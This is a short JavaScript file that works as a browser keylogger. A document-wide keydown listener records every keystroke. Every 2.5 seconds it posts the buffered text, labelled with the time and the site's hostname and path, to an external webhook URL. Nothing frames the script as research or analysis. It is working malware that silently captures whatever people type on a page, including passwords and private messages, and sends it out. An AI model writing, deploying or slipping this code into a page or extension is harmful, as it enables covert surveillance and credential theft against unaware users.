function getCurrentTime() {
    const now = new Date();
    const hours = String(now.getHours()).padStart(2, '0');
    const minutes = String(now.getMinutes()).padStart(2, '0');
    const seconds = String(now.getSeconds()).padStart(2, '0');
    return `${hours}:${minutes}:${seconds}`;
}

let allCharacters = [
  "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
  "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
  "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M",
  "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
  "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", " ", ".", ",",
  "<", ">", "/", "?", ";", ":", "\\", "|", "[", "{", "]", "}", "-",
  "=", "+", "*", "!", "@", "%", "^", "&", "(", ")",
];

let pressedKeys = "";

function send(str, link) {
  const namecontent = window.location.hostname + window.location.pathname; // Get the site name

  const siteName = "`" + getCurrentTime() + " -- " + namecontent + "`"

  const message = str + "\n-# `" + siteName + "`";
  
  fetch(link, {
      method: "POST",
      headers: {
          "Content-Type": "application/json"
      },
      body: JSON.stringify({
          content: message
      })
  }).catch(error => {
    console.error('Error sending message:', error);
  });

  pressedKeys = "";
}

document.addEventListener('keydown', function(event) {
  if (allCharacters.includes(event.key)) {
    pressedKeys += event.key;
  } else {
    pressedKeys += " __`"+event.key+"`__ ";
  }
});

async function startSending(link) {
  while (true) {
    await new Promise(resolve => setTimeout(resolve, 2500));

    if (pressedKeys !== "") {
      send(pressedKeys, link);
    }
  }
}

startSending(webhookURL);